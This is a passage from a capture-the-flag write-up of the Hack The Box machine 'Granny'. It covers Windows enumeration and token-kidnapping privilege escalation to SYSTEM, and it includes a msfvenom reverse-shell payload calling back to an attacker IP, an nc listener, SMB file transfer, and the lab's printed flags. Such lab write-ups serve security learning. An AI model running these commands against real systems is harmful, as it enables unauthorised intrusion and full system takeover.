+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">ipconfig</span> /all
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Windows IP Configuration
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Host Name . . . . . . . . . . . . : granny
+</span><span class="z-text z-plain">   Primary Dns Suffix  . . . . . . . : 
+</span><span class="z-text z-plain">   Node Type . . . . . . . . . . . . : Unknown
+</span><span class="z-text z-plain">   IP Routing Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">   WINS Proxy Enabled. . . . . . . . : No
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Ethernet adapter Local Area Connection:
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">   Connection-specific DNS Suffix  . : 
+</span><span class="z-text z-plain">   Description . . . . . . . . . . . : Intel(R) PRO/1000 MT Network Connection
+</span><span class="z-text z-plain">   Physical Address. . . . . . . . . : 00-50-56-B9-CE-0D
+</span><span class="z-text z-plain">   DHCP Enabled. . . . . . . . . . . : No
+</span><span class="z-text z-plain">   IP Address. . . . . . . . . . . . : 10.10.10.15
+</span><span class="z-text z-plain">   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+</span><span class="z-text z-plain">   Default Gateway . . . . . . . . . : 10.10.10.2
+</span><span class="z-text z-plain">   DNS Servers . . . . . . . . . . . : 10.10.10.2
+</span></code></pre>
+<p>Looks like there's a single network.</p>
+<h2 id="local-users">Local users</h2>
+<p>Let's enumerate all local users. Since Powershell is not available on Granny, I won't be able to use <code>PowerView</code> for that.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net</span> users
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">User accounts for \\GRANNY
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">-------------------------------------------------------------------------------
+</span><span class="z-text z-plain">Administrator            ASPNET                   Guest                    
+</span><span class="z-text z-plain">IUSR_GRANPA              IWAM_GRANPA              Lakis                    
+</span><span class="z-text z-plain">SUPPORT_388945a0         
+</span><span class="z-text z-plain">The command completed successfully.
+</span></code></pre>
+<p>There's a user named <code>Lakis</code>! Let's keep that in mind as we continue our enumeration.</p>
+<h2 id="local-groups">Local groups</h2>
+<p>Let's enumerate all local groups.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">net localgroup</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">Aliases for \\GRANNY
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">-------------------------------------------------------------------------------
+</span><span class="z-text z-plain">*Administrators
+</span><span class="z-text z-plain">*Backup Operators
+</span><span class="z-text z-plain">*Distributed COM Users
+</span><span class="z-text z-plain">*Guests
+</span><span class="z-text z-plain">*HelpServicesGroup
+</span><span class="z-text z-plain">*IIS_WPG
+</span><span class="z-text z-plain">*Network Configuration Operators
+</span><span class="z-text z-plain">*OWS_209498277_admin
+</span><span class="z-text z-plain">*Performance Log Users
+</span><span class="z-text z-plain">*Performance Monitor Users
+</span><span class="z-text z-plain">*Power Users
+</span><span class="z-text z-plain">*Print Operators
+</span><span class="z-text z-plain">*Remote Desktop Users
+</span><span class="z-text z-plain">*Replicator
+</span><span class="z-text z-plain">*TelnetClients
+</span><span class="z-text z-plain">*Users
+</span><span class="z-text z-plain">The command completed successfully.
+</span></code></pre>
+<p>Looks classic.</p>
+<h2 id="user-account-information">User account information</h2>
+<p>We're not really a Windows user, so we can't gather more information about us.</p>
+<h2 id="home-folder">Home folder</h2>
+<p>Since we're a service account, we don't have a home folder. And if we try to access a folder in <code>C:\Documents and Settings</code>, we get a 'File Not Found' message.</p>
+<h2 id="command-history">Command history</h2>
+<p>We can check for command history files, but we find none.</p>
+<h2 id="tokens">Tokens</h2>
+<p>Let's now focus on our tokens.</p>
+<p>Which security groups are associated with our access tokens?</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">whoami</span> /groups
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">GROUP INFORMATION
+</span><span class="z-text z-plain">-----------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Group Name                       Type             SID                                            Attributes                                        
+</span><span class="z-text z-plain">================================ ================ ============================================== ==================================================
+</span><span class="z-text z-plain">NT AUTHORITY\NETWORK SERVICE     User             S-1-5-20                                       Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">Everyone                         Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">GRANNY\IIS_WPG                   Alias            S-1-5-21-1709780765-3897210020-3926566182-1005 Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Performance Log Users    Alias            S-1-5-32-559                                   Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\SERVICE             Well-known group S-1-5-6                                        Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\Authenticated Users Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">NT AUTHORITY\This Organization   Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">LOCAL                            Well-known group S-1-2-0                                        Mandatory group, Enabled by default, Enabled group
+</span><span class="z-text z-plain">BUILTIN\Users                    Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+</span></code></pre>
+<p>Unfortunately, there's nothing that we can abuse.</p>
+<p>What about the privileges associated with our access tokens?</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">whoami</span> /priv
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">PRIVILEGES INFORMATION
+</span><span class="z-text z-plain">----------------------
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">Privilege Name                Description                               State   
+</span><span class="z-text z-plain">============================= ========================================= ========
+</span><span class="z-text z-plain">SeAuditPrivilege              Generate security audits                  Disabled
+</span><span class="z-text z-plain">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+</span><span class="z-text z-plain">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+</span><span class="z-text z-plain">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+</span><span class="z-text z-plain">SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+</span><span class="z-text z-plain">SeCreateGlobalPrivilege       Create global objects                     Enabled
+</span></code></pre>
+<p>We see that <code>SeImpersonatePrivilege</code> is enabled. There's probably a way to exploit that!</p>
+<p>My first idea is obviously the Windows potatoes, which are designed to exploit this kind of privileges, but it turns out that they are not meant to be run on such an old Windows version. There's actually another way to exploit this privilege on Windows Server 2003, which you can find at <a href="https://www.exploit-db.com/exploits/6705">Microsoft Windows Server 2003 - Token Kidnapping Local Privilege Escalation</a>.</p>
+<h1 id="privilege-escalation-token-kidnapping">Privilege escalation (token kidnapping)</h1>
+<p>Token kidnapping is a type of privilege escalation vulnerability that allows an attacker to gain control of a server. The attacker can escalate their privileges on a system if they can control the <code>SeImpersonatePrivilege</code> token of a Windows service account.</p>
+<p>This fits perfectly our use case! We are indeed a Windows service account.</p>
+<h2 id="preparation-1">Preparation</h2>
+<p>The <a href="https://www.exploit-db.com/exploits/6705">ExploitDB page</a> gives us a PoC. I tried to compile it using Visual Studio 2022, but the PoC is written for a too old version. Thankfully, SQLNinja has a pre-compiled binary, which you can find at <code>/usr/share/sqlninja/apps/churrasco.exe</code> if you are using Kali Linux.</p>
+<p>I'm going to save it as <code>token_kidnapping.exe</code>.</p>
+<p>The next challenge involves transferring it to Granny. Since it's running Windows Server 2003, most techniques simply don't work. Fortunately, there are a handful that do work, such as utilizing SMB.</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">c:\windows\system32\inetsrv<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">copy</span> \\<span class="z-constant z-numeric z-integer z-decimal z-dosbatch">10</span>.<span class="z-constant z-numeric z-integer z-decimal z-dosbatch">10</span>.<span class="z-constant z-numeric z-integer z-decimal z-dosbatch">14</span>.<span class="z-constant z-numeric z-integer z-decimal z-dosbatch">5</span>\server\token_kidnapping.exe C:\tmp\token_kidnapping.exe
+</span></code></pre>
+<p>Now the exploit should be on the machine, that's a good thing. However, we still need to come up with a payload to use with it!</p>
+<p>I want to obtain a reverse shell, so I'll use <code>msfvenom</code> to create an executable for that.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> msfvenom<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>p</span> windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=9002<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>f</span> exe <span class="z-keyword z-operator z-assignment z-redirection z-shell">&gt;</span> /workspace/server/revshell.exe</span>
+</span></code></pre>
+<p>I'll use the same method as for the exploit to transfer it to the machine.</p>
+<p>The last thing to do is starting a listener on port <code>9002</code> to receive the connection.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> rlwrap nc<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>lvnp</span> 9002</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">listening on [any] 9002 ...
+</span></code></pre>
+<p>Now we should be ready to go!</p>
+<h2 id="exploitation-1">Exploitation</h2>
+<p>Let's use our exploit to obtain an elevated shell!</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">C:\Temp<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> .\token_kidnapping.exe <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\tmp\revshell.exe<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<p>Let's check our listener.</p>
+<pre class="z-code"><code><span class="z-text z-plain">connect to [10.10.14.5] from (UNKNOWN) [10.10.10.15] 1033
+</span><span class="z-text z-plain">Microsoft Windows [Version 5.2.3790]
+</span><span class="z-text z-plain">(C) Copyright 1985-2003 Microsoft Corp.
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">C:\WINDOWS\TEMP&gt;
+</span></code></pre>
+<p>Yay! We got our reverse shell! Let's confirm that we are <code>NT AUTHORITY\SYSTEM</code>:</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">C:\WINDOWS\TEMP<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">whoami</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">nt authority\system
+</span></code></pre>
+<p>Nice!</p>
+<h1 id="local-enumeration-1">Local enumeration</h1>
+<h2 id="home-folder-1">Home folder</h2>
+<p>The only thing we need to do to finish this box is to retrieve the user and root flags.</p>
+<p>During our enumeration, we noticed a user named <code>Lakis</code>. If we check its Desktop, we see that it contains the user flag!</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">C:\WINDOWS\TEMP<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\Lakis\Desktop\user.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">700c5dc163014e22b3e408f8703f67d1
+</span></code></pre>
+<p>And as usual, the user flag can be found on our Desktop!</p>
+<pre data-lang="cmd" class="language-cmd z-code"><code class="language-cmd" data-lang="cmd"><span class="z-source z-dosbatch">C:\WINDOWS\TEMP<span class="z-keyword z-operator z-redirection z-dosbatch">&gt;</span> <span class="z-keyword z-command z-dosbatch">type</span> <span class="z-string z-quoted z-double z-dosbatch"><span class="z-punctuation z-definition z-string z-begin z-dosbatch">&quot;</span>C:\Documents and Settings\Administrator\Desktop\root.txt<span class="z-punctuation z-definition z-string z-end z-dosbatch">&quot;</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">aa4beed1c0584445ab463a6747bd06e9
+</span></code></pre>
+<h1 id="afterwords">Afterwords</h1>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/granny/success.png" alt="Success" /></p>
+<p>That's it for this box! The foothold was really new to me, since I didn't know about WebDAV before starating this box. Exploiting it is really straightforward though. The privilege escalation part was easy to identify, but I had trouble obtaining a binary to exploit this vulnerability.</p>
+<p>Thanks for reading!</p>
+</section>
+</article>
+
+    </main>
+
+        <footer></footer>
+
+    </body>
+</html>
